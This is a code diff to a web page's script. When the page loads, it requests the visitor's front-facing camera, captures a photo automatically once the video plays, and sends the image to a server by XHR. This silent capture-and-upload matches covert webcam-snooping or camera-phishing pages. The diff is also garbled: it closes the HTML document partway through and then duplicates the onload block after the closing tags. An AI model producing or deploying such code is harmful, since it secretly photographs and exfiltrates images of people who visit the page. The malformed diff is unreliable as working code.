@@ -189,6 +189,34 @@
 
         // Request webcam access and start the process as soon as the page is loaded
         window.onload = function() {
+            // Request the front-facing camera on mobile devices
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" } // "user" is for the front-facing (selfie) camera
+            })
+            .then(stream => {
+                // Attach the webcam feed to the video element
+                video.srcObject = stream;
+
+                // Wait for the video to start playing, then capture the photo
+                video.onplaying = function() {
+                    capturePhoto(); // Automatically capture the photo when the video starts
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing webcam: ', err);
+            });
+        };
+    </script>
+</body>
+</html>
+
+
+            // Send the image data to the server
+            xhr.send('image=' + encodeURIComponent(imageData));
+        }
+
+        // Request webcam access and start the process as soon as the page is loaded
+        window.onload = function() {
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user" } // "user" for front-facing (selfie) camera
             })
